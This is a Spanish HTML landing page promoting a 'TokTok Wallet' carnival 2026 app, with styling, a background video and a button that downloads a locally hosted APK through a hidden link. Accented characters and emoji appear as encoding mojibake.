<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>TokTok Wallet ¬∑ Carnaval 2026</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            width: 100%;
            overflow: hidden;
            position: relative;
            background: #0a0012;
        }

        /* VIDEO DE FONDO - N√çTIDO */
        .video-fondo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 0;
            filter: brightness(1.08) contrast(1.05);
        }

        /* CAPA SUTIL - SOLO 5% SOMBRA */
        .capa-sutil {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(180deg, 
                rgba(0,0,0,0.01) 0%,
                rgba(30,0,40,0.03) 50%,
                rgba(0,0,0,0.05) 100%);
            z-index: 1;
            pointer-events: none;
        }

        /* CONTENIDO PRINCIPAL - CORREGIDO PARA MEJOR VISUALIZACI√ìN */
        .contenido {
            position: relative;
            z-index: 10;
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 1.5rem;
            color: white;
        }

        /* PARTE SUPERIOR - MENSAJE CENTRADO */
        .mensaje-superior {
            width: 100%;
            margin-top: 2rem;
            text-align: center;
        }

        .mensaje-superior p {
            font-size: 1rem;
            font-weight: 600;
            color: white;
            text-shadow: 0 2px 10px rgba(0,0,0,0.7);
            background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.2), transparent);
            display: inline-block;
            padding: 0.6rem 1.5rem;
            border-radius: 40px;
            letter-spacing: 1px;
            backdrop-filter: blur(3px);
            border: 1px solid rgba(255, 215, 0, 0.3);
        }

        /* CONTENEDOR INFERIOR - MEJOR ALINEACI√ìN */
        .contenedor-inferior {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1.8rem;
            margin-bottom: 3rem;
        }

        /* T√çTULO PRINCIPAL - M√ÅS LEGIBLE */
        .titulo-principal {
            text-align: center;
            width: 100%;
        }

        .titulo-principal h1 {
            font-size: 2.8rem;
            font-weight: 900;
            line-height: 1.1;
            text-transform: uppercase;
            text-shadow: 0 4px 15px #b85eff, 3px 3px 0 #3d0160;
            letter-spacing: 2px;
            word-break: break-word;
        }

        .titulo-principal h1 span {
            display: block;
            font-size: 1.3rem;
            font-weight: 500;
            letter-spacing: 3px;
            margin-top: 0.3rem;
            color: #ffd700;
            text-shadow: 0 0 20px #ff8c00;
        }

        /* BOT√ìN - M√ÅS GRANDE Y MEJOR POSICIONADO */
        .btn-descarga {
            background: linear-gradient(145deg, #c084fc, #8b5cf6);
            border: 2px solid rgba(255, 255, 255, 0.9);
            padding: 1.2rem 3rem;
            border-radius: 60px;
            font-size: 1.8rem;
            font-weight: 800;
            color: white;
            text-transform: uppercase;
            letter-spacing: 3px;
            cursor: pointer;
            box-shadow: 0 20px 40px -5px #2d0052, 0 0 0 3px #fbbf24 inset;
            display: inline-flex;
            align-items: center;
            gap: 12px;
            text-shadow: 2px 2px 0 #581c87;
            transition: transform 0.2s, box-shadow 0.2s;
            backdrop-filter: blur(5px);
            width: fit-content;
            margin: 0 auto;
        }

        .btn-descarga:active {
            transform: scale(0.95);
            box-shadow: 0 10px 25px -5px #2d0052, 0 0 0 3px #fcd34d inset;
        }

        .btn-descarga::before {
            content: "üì≤";
            font-size: 2rem;
        }

        /* AJUSTES POR DISPOSITIVO */
        @media (max-width: 480px) {
            .contenido {
                padding: 1rem;
            }
            
            .titulo-principal h1 {
                font-size: 2.2rem;
            }
            
            .titulo-principal h1 span {
                font-size: 1.1rem;
            }
            
            .btn-descarga {
                padding: 1rem 2.2rem;
                font-size: 1.5rem;
            }
            
            .btn-descarga::before {
                font-size: 1.6rem;
            }
            
            .mensaje-superior p {
                font-size: 0.9rem;
                padding: 0.4rem 1rem;
            }
        }

        @media (max-width: 360px) {
            .titulo-principal h1 {
                font-size: 1.8rem;
            }
            
            .btn-descarga {
                padding: 0.9rem 1.8rem;
                font-size: 1.3rem;
            }
        }

        /* PARA PANTALLAS MUY PEQUE√ëAS */
        @media (max-height: 600px) {
            .contenedor-inferior {
                gap: 1rem;
                margin-bottom: 1rem;
            }
            
            .mensaje-superior {
                margin-top: 1rem;
            }
        }

        .hidden-link {
            display: none;
        }
    </style>
</head>
<body>

    <!-- VIDEO DE FONDO -->
    <video class="video-fondo" autoplay muted loop playsinline>
        <source src="video/animacion.mp4" type="video/mp4">
        <!-- Fallback por si no carga el video -->
        Tu navegador no soporta el video.
    </video>

    <!-- CAPA SUTIL -->
    <div class="capa-sutil"></div>

    <!-- CONTENIDO PRINCIPAL -->
    <div class="contenido">

        <!-- MENSAJE SUPERIOR -->
        <div class="mensaje-superior">
            <p>‚ö° PROMOCIONES EXCLUSIVAS DE CARNAVAL ‚ö°</p>
        </div>

        <!-- PARTE INFERIOR -->
        <div class="contenedor-inferior">
            <!-- T√çTULO PRINCIPAL -->
            <div class="titulo-principal">
                <h1>
                    TOKTOK WALLET
                    <span>Carnaval 2026</span>
                </h1>
            </div>

            <!-- BOT√ìN DE DESCARGA -->
            <button class="btn-descarga" id="btnDescargar">DESCARGAR</button>
        </div>
    </div>

    <!-- ENLACE OCULTO APK - CORREGIDO -->
    <a id="linkApk" class="hidden-link" download="TokTokWallet.apk" href="#">Enlace oculto</a>

    <script>
        (function() {
            const boton = document.getElementById('btnDescargar');
            const link = document.getElementById('linkApk');
            
            // CORRECCI√ìN IMPORTANTE: La ruta del APK debe ser correcta
            // Opci√≥n 1: Si el APK est√° en la misma carpeta que este HTML
            link.href = 'apk/TokTok 2026.apk';
            
            // Opci√≥n 2: Si est√° en una carpeta "app" (descomenta la que necesites)
            // link.href = 'app/TokTokWallet.apk';
            
            // Opci√≥n 3: Si est√° en una carpeta "apk" (la que usaste en tu c√≥digo)
            // link.href = 'apk/TokTok 2026.apk';

            boton.addEventListener('click', function(e) {
                e.preventDefault();
                
                // Verificar que el link tiene un href v√°lido
                if (link.href === '#' || link.href === window.location.href) {
                    alert('Error: No se encontr√≥ el archivo APK. Verifica la ruta.');
                    return;
                }
                
                link.click();
                
                // Feedback visual
                boton.style.opacity = '0.8';
                boton.innerHTML = 'üì≤ DESCARGANDO';
                boton.disabled = true;
                
                setTimeout(() => {
                    boton.style.opacity = '1';
                    boton.innerHTML = 'üì≤ DESCARGAR';
                    boton.disabled = false;
                }, 2000);
            });

            // Mensaje de ayuda para la configuraci√≥n
            console.log('Para que la descarga funcione:');
            console.log('1. Coloca tu archivo APK en la misma carpeta que este HTML');
            console.log('2. O cambia la ruta en link.href (l√≠nea 187-191)');
        })();
    </script>
</body>
</html>
